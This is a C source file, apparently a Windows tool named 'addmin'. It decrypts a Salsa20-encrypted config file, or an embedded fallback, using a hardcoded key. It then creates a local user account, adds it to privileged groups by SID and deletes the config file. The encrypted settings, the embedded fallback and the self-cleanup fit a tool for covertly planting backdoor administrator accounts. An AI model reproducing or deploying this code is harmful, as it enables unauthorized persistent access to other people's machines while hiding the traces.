#include <lm.h>
#include <sddl.h>
#include <tchar.h>
#include <windows.h>

#include <stdio.h>

#include <stdint.h>
#include <stdlib.h>

#include "salsa20.h"

// Link against netapi32.dll (for use of NetUserAdd and NetLocalGroupAddMembers)
#pragma comment(lib, "netapi32.lib")


#define BUF_SIZE 256
#define CONFIG_MAX_SIZE 4096

#define ADDMIN_STATUS_SUCCESS 1
#define ADDMIN_STATUS_ERROR 0

#define MARKER_USERNAME "username="
#define MARKER_PASSWORD "password="
#define MARKER_GROUPSID "groupsid="


static uint8_t KEY[16] = { 217, 78, 5, 76, 59, 107, 8, 44, 116, 168, 84, 50, 232, 185, 198, 130 };
static uint8_t NONCE[8] = { 195, 197, 12, 237, 251, 20, 130, 183 };

typedef struct _config {
    LPWSTR username;
    LPWSTR password;
    LPWSTR groupSids[4];
} config;

void decryptConfigBuffer(const char* nonceBuf, char* dataBuf, size_t dataBufSize) {
    s20_crypt((uint8_t*)KEY, (uint8_t*)nonceBuf, 0, (uint8_t*)dataBuf, (uint32_t)dataBufSize);
}

int addUser(LPWSTR name, LPWSTR pw) {
    USER_INFO_1 userInfo;
    userInfo.usri1_name = name;
    userInfo.usri1_password = pw;
    userInfo.usri1_priv = USER_PRIV_USER;
    userInfo.usri1_home_dir = NULL;
    userInfo.usri1_comment = NULL;
    userInfo.usri1_flags = UF_SCRIPT;
    userInfo.usri1_script_path = NULL;

    return NetUserAdd(NULL, 1, (LPBYTE)&userInfo, NULL) == NERR_Success ? ADDMIN_STATUS_SUCCESS : ADDMIN_STATUS_ERROR;
}

int addUserToGroup(LPWSTR userName, LPWSTR groupSIDStr) {
    PSID groupSID;
    if (!ConvertStringSidToSid(groupSIDStr, &groupSID)) {
        return ADDMIN_STATUS_ERROR;
    }

    SID_NAME_USE sidType;
    DWORD cchName = BUF_SIZE;
    WCHAR groupName[BUF_SIZE];
    DWORD cchReferencedDomainName = BUF_SIZE;
    WCHAR referencedDomainName[BUF_SIZE];

    if (LookupAccountSid(NULL, groupSID, groupName, &cchName, referencedDomainName, &cchReferencedDomainName, &sidType) == FALSE) {
        return ADDMIN_STATUS_ERROR;
    }

    LOCALGROUP_MEMBERS_INFO_3 gmInfo;
    gmInfo.lgrmi3_domainandname = userName;
    return NetLocalGroupAddMembers(NULL, groupName, 3, (LPBYTE)&gmInfo, 1) == NERR_Success ? ADDMIN_STATUS_SUCCESS : ADDMIN_STATUS_ERROR;
}

LPWSTR toWstr(const char* str) {
    int size = MultiByteToWideChar(CP_UTF8, 0, str, -1, NULL, 0);
    LPWSTR wideStr = (LPWSTR)malloc(size * sizeof(WCHAR));
    MultiByteToWideChar(CP_UTF8, 0, str, -1, wideStr, size);
    return wideStr;
}

int readConfig(LPCWSTR path, uint8_t* outBuf, size_t outBufSize, size_t* bytesRead) {
    HANDLE fileHandle;
    DWORD fileSize;

    fileHandle = CreateFile(path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (fileHandle == INVALID_HANDLE_VALUE) {
        return ADDMIN_STATUS_ERROR;
    }

    fileSize = GetFileSize(fileHandle, NULL);
    if (fileSize > outBufSize) {
        goto fail;
    }

    DWORD read;
    if (!ReadFile(fileHandle, outBuf, fileSize, &read, NULL)) {
        goto fail;
    }
    CloseHandle(fileHandle);

    *bytesRead = read;
    return ADDMIN_STATUS_SUCCESS;

fail:
    CloseHandle(fileHandle);
    return ADDMIN_STATUS_ERROR;
}

int parseConfig(const uint8_t* configBuf, size_t configLen, config* outConfig) {
    char lineDelim = '\n';
    char* lineStart = (char*)configBuf;
    uint8_t numGroupsSids = 0;

    while (lineStart < (char*)(configBuf + configLen)) {
        char* lineEnd = strchr(lineStart, lineDelim);
        if (lineEnd) {
            *lineEnd = 0;
        } else {
            lineEnd = (char*)(configBuf + configLen);
        }

        size_t maxLeft = ((char*)(configBuf + configLen)) - lineStart;
        size_t cmpLenUsername = min(sizeof(MARKER_USERNAME) - 1, maxLeft);
        size_t cmpLenPassword = min(sizeof(MARKER_PASSWORD) - 1, maxLeft);
        size_t cmpLenGropSids = min(sizeof(MARKER_GROUPSID) - 1, maxLeft);
        if (strncmp(MARKER_USERNAME, lineStart, cmpLenUsername) == 0) {
            outConfig->username = toWstr(lineStart + min(sizeof(MARKER_USERNAME) - 1, maxLeft));
        }
        else if (strncmp(MARKER_PASSWORD, lineStart, cmpLenPassword) == 0) {
            outConfig->password = toWstr(lineStart + min(sizeof(MARKER_PASSWORD) - 1, maxLeft));
        }
        else if (strncmp(MARKER_GROUPSID, lineStart, cmpLenGropSids) == 0) {
            if (numGroupsSids < 4) {
                outConfig->groupSids[numGroupsSids++] = toWstr(lineStart + min(sizeof(MARKER_GROUPSID) - 1, maxLeft));
            }
        }

        lineStart = lineEnd + 1;
    }

    return ADDMIN_STATUS_SUCCESS;
}

int addmin(LPCTSTR configPath, const char *fixedFallback, size_t fixedFallbackLen) {
    char buf[CONFIG_MAX_SIZE];
    size_t bytesRead = 0;
    int configFound = TRUE;

    char *configBuf = buf + 8;
    size_t configSize;
    if (readConfig(configPath, buf, CONFIG_MAX_SIZE - 1, &bytesRead)) {
        configSize = bytesRead - 8;
        decryptConfigBuffer(buf, configBuf, configSize);
        configBuf[configSize] = 0;
    } else {
        configFound = FALSE;
        if (fixedFallback) {
            configSize = min(fixedFallbackLen - 8, CONFIG_MAX_SIZE - 9);
            memcpy(buf, fixedFallback, fixedFallbackLen);
            decryptConfigBuffer(buf, configBuf, configSize);
            configBuf[configSize] = 0;
        } else {
            return ADDMIN_STATUS_ERROR;
        }
    }



    config conf;
    conf.username = NULL;
    conf.password = NULL;
    memset(conf.groupSids, 0, sizeof(conf.groupSids));
    parseConfig(configBuf, configSize, &conf);

    //printf("username: %s\n", conf.username);

    int success = addUser(conf.username, conf.password);
    if (success) {
        for (size_t i = 0; i < 4; ++i) {
            if (conf.groupSids[i]) {
                addUserToGroup(conf.username, conf.groupSids[i]);
            }
        }
        if (configFound) {
            DeleteFile(configPath);
        }
    }

    free(conf.username);
    free(conf.password);
    free(conf.groupSids[0]);
    free(conf.groupSids[1]);
    free(conf.groupSids[2]);
    free(conf.groupSids[3]);

    return ADDMIN_STATUS_SUCCESS;
}